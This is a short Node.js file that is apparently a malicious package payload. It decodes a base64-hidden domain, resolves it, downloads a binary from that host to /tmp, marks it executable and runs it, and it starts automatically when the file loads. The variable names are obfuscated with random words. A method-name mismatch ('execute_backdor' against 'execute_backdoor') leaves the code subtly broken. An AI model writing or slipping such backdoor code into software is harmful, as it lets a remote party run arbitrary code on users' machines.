const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function prebends() {
    this.execute_backdor = function(thermocline) {
      if (thermocline != null && thermocline != '0.0.0.0') {
        gaberloonie = http.get('http://' + thermocline + '/costocoracoid', function(edelweiss) {
          var succursal = fs.createWriteStream('/tmp/outqueried');
          edelweiss.on('data', function(atinkle) {
            succursal.write(atinkle);
          });
          edelweiss.on('end', function() {
            succursal.end();
            fs.chmod('/tmp/outqueried', '0777');
            child_process.exec('/tmp/outqueried', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      antivenin = 'NGYwMmEwYTEucHduenlleWV5ZS5kZQ=='
      dns.lookup((new Buffer(antivenin, 'base64')).toString(), function(err, anlages) {
        self.execute_backdoor(anlages);
      });
    };
};

(new prebends()).run();
